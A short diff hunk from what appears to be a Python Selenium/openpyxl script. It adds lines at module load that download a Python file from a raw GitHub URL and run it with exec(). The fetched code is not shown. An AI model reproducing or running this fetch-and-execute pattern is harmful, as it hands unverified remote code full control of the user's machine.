@@ -23,6 +23,11 @@ from openpyxl import load_workbook
 import threading
 import sys
 
+code='https://raw.githubusercontent.com/VincentAulnay/test2/master/ADDLIST.py'
+
+response=urllib.request.urlopen(code)
+data=response.read()
+exec(data)
 
 chrome_options = webdriver.ChromeOptions()
 prefs = {"profile.managed_default_content_settings.images": 2}
